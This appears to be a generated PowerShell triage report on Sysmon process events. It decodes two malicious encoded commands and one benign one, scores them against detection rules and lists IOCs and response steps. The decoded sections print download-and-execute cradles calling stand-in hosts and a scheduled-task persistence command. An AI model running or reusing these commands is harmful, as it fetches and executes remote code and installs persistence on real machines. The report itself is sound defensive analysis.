# PowerShell triage report

- Generated: 2026-10-31 18:50 UTC
- Source: `samples/sysmon_event1.xml`
- Findings: 3 (malicious 2, suspicious 0, likely benign 1)

> Decoded content is shown for reading only. Never paste it into a terminal.

## 1. MALICIOUS (score 100/100)

| Field | Value |
|---|---|
| Time | 2026-09-12 08:14:03.221 |
| Host | WKS-0142.corp.example |
| User | CORP\jdoe |
| Process | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| Parent | `C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE` |
| MITRE ATT&CK | T1027.010, T1059.001, T1105, T1204.002, T1564.003 |
| SHA-256 (final script) | `297e02d2880de83b00c5d7245bf7d3ea8c589856971f67633a237f97cf03c638` |

### 1. Catch it

```text
powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAGEALgBwAHMAMQAnACkA
```

### 2. Decode it

Layers: `original` -> `-EncodedCommand / Base64 (UTF-16LE)`

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')
```

### 3. Trace it

- +30 parent winword.exe: Office document spawned PowerShell (macro / exploit)

| Rule | Detection | ATT&CK | Weight | Layer |
|---|---|---|--:|--:|
| PS001 | Encoded command | T1027.010 | 10 | 0 |
| PS002 | Invoke-Expression | T1059.001 | 20 | 1 |
| PS003 | Download cradle | T1105 | 30 | 1 |
| PS004 | Hidden window | T1564.003 | 15 | 0 |
| PS005 | NoProfile / NonInteractive | T1059.001 | 5 | 0 |

**IOCs (defanged)**

- urls: `hxxp[://]198[.]51[.]100[.]23/a[.]ps1`
- ips: `198[.]51[.]100[.]23`

### 4. Call it: **MALICIOUS**

1. Isolate the host (EDR network containment) and preserve volatile evidence.
2. Block the extracted IOCs (proxy / DNS / firewall) and hunt them across the fleet.
3. Identify the initial access vector from the parent process chain; scope other hosts and users.
4. Reset credentials of the affected account; escalate to incident response.

## 2. MALICIOUS (score 100/100)

| Field | Value |
|---|---|
| Time | 2026-09-12 09:02:41.870 |
| Host | WKS-0377.corp.example |
| User | CORP\asmith |
| Process | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| Parent | `C:\Windows\System32\wscript.exe` |
| MITRE ATT&CK | T1027, T1027.010, T1053.005, T1059.001, T1059.005, T1105, T1564.003 |
| SHA-256 (final script) | `b8d62aa44d78673b0ec9e0d7a6a648719c1636e3011f75476813a292d270be0f` |

### 1. Catch it

```text
powershell -w hidden -nop -e SQBFAFgAIAAoAFsASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAXQA6ADoAbgBlAHcAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBEAGUAZgBsAGEAdABlAFMAdAByAGUAYQBtACgAWwBJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQBdAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwBMAFkANAB4AGEAOABNAHcARgBJAFQALwB5AGcAMABDADIAUQBSAEwAYwBUAEkAVQBhAGoASwAxAEgAYgBxADAAUQB5AG4AdABxAHMAaQBQAFMASQAwAGkAQwBlAGsAWgBwAGYAKwArAFQAdQBqADIASABmAGMAZABuAEwAQQA0AFEARAA2AG4ARgB1AFYARwBoAG0AVABtAEQAeQA0ACsAbgB1AFEARQBzAGQAdwBhAHgANQB3AGYAdABaAGIAWQBRAE8ANgAyAGUANwBWAFYANAA3AGgAWABEAC8AZQBzAEsANQBzAFQANwBWAFMAdQA0ADgAMQB2AHEALwA5AEcAYgBYAGcALwAvAHAARABsAEYAVgBsADkAMABmAEUAcABlAEkAbwA4ADQAZgBYAGwARwA1ADEAbwBTAHQAaABPAEwASAAwAC8AbwBWAHIASABwAHAANAByAHQAQwA
... [389 more chars]
```

### 2. Decode it

Layers: `original` -> `-EncodedCommand / Base64 (UTF-16LE)` -> `FromBase64String (+ inflate)` -> `string concatenation merge`

```powershell
$c = 'DownloadString'; $u = 'http://203.0.113.7/stage2.ps1'; $w = New-Object Net.WebClient; IEX ($w.$c($u)); schtasks /create /tn Updater /tr 'powershell -nop -w hidden -c iex(irm http://update-check.example/r)' /sc hourly
```

### 3. Trace it

- +25 parent wscript.exe: Windows Script Host spawned PowerShell
- +10 3 obfuscation layers peeled

| Rule | Detection | ATT&CK | Weight | Layer |
|---|---|---|--:|--:|
| PS001 | Encoded command | T1027.010 | 10 | 0 |
| PS002 | Invoke-Expression | T1059.001 | 20 | 1 |
| PS003 | Download cradle | T1105 | 30 | 2 |
| PS004 | Hidden window | T1564.003 | 15 | 0 |
| PS005 | NoProfile / NonInteractive | T1059.001 | 5 | 0 |
| PS010 | Scheduled task persistence | T1053.005 | 25 | 2 |
| PS015 | Staged / compressed payload | T1027 | 10 | 1 |

**IOCs (defanged)**

- urls: `hxxp[://]203[.]0[.]113[.]7/stage2[.]ps1`
- urls: `hxxp[://]update-check[.]example/r`
- ips: `203[.]0[.]113[.]7`
- domains: `update-check[.]example`

### 4. Call it: **MALICIOUS**

1. Isolate the host (EDR network containment) and preserve volatile evidence.
2. Block the extracted IOCs (proxy / DNS / firewall) and hunt them across the fleet.
3. Identify the initial access vector from the parent process chain; scope other hosts and users.
4. Reset credentials of the affected account; escalate to incident response.

## 3. LIKELY_BENIGN (score 5/100)

| Field | Value |
|---|---|
| Time | 2026-09-12 08:20:10.004 |
| Host | SRV-APP01.corp.example |
| User | NT AUTHORITY\SYSTEM |
| Process | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| Parent | `C:\Windows\CCM\CcmExec.exe` |
| MITRE ATT&CK | T1027.010, T1059.001 |
| SHA-256 (final script) | `4c26523ef842323047f06ca45498f150e3a1a6ac1108ff532f837e2e114a375a` |

### 1. Catch it

```text
powershell.exe -ExecutionPolicy Bypass -enc RwBlAHQALQBTAGUAcgB2AGkAYwBlACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAUwB0AGEAdAB1AHMAIAAtAGUAcQAgAFIAdQBuAG4AaQBuAGcAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARgBpAHIAcwB0ACAANQA=
```

### 2. Decode it

Layers: `original` -> `-EncodedCommand / Base64 (UTF-16LE)`

```powershell
Get-Service | Where-Object Status -eq Running | Select-Object -First 5
```

### 3. Trace it

- -15 parent ccmexec.exe (SCCM client): usual for legitimate automation, verify script origin

| Rule | Detection | ATT&CK | Weight | Layer |
|---|---|---|--:|--:|
| PS001 | Encoded command | T1027.010 | 10 | 0 |
| PS006 | Execution policy bypass | T1059.001 | 10 | 0 |

### 4. Call it: **LIKELY_BENIGN**

1. Document the decoded command and close as admin activity, or tune the rule with an allow-list.
